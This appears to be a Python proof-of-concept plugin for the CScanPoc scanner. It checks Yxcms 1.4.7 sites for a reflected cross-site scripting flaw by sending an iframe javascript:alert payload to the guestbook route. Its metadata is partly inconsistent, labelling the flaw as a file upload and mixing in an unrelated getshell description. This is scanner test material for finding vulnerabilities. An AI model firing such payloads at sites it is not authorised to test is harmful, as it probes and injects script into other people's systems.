# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'YXCMS_0101'  # 平台漏洞编号，留空
    name = 'Yxcms跨站脚本'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2014-09-24'  # 漏洞公布时间
    desc = '''
    YXCMS(新云CMS)建站系统存在ewebeditor上传和iis解析漏洞，可批量getshell。
    Yxcms building system（compatible cell phone）是一套网站创建系统。
    Yxcms building system (compatible cell phone)1.4.7版本中存在跨站脚本漏洞。
    远程攻击者可通过向index.php?r=default/column/index&col=guestbook请求中的protected\apps\default\view\default\extend_guestbook.php或
    protected\apps\default\view\mobile\extend_guestbook.php文件发送‘content’参数利用该漏洞向网页中注入恶意代码。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-06865'  # 漏洞来源
    cnvd_id = 'CNVD-2018-06865'  # cnvd漏洞编号
    cve_id = 'CVE-2018-8805 '  # cve编号
    product = 'YXCMS(新云CMS)'  # 漏洞应用名称
    product_version = '1.4.7'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3cf1c16f-32fc-4e66-8831-27d6b70f4e2c'
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-07-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "index.php?r=default/column/index&col=guestbook&name=<IFRAME src=javascript:alert('cscanhyhmnn')></IFRAME>"
            vul_url = self.target + payload
            response = requests.get(vul_url)
            if "cscanhyhmnn" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
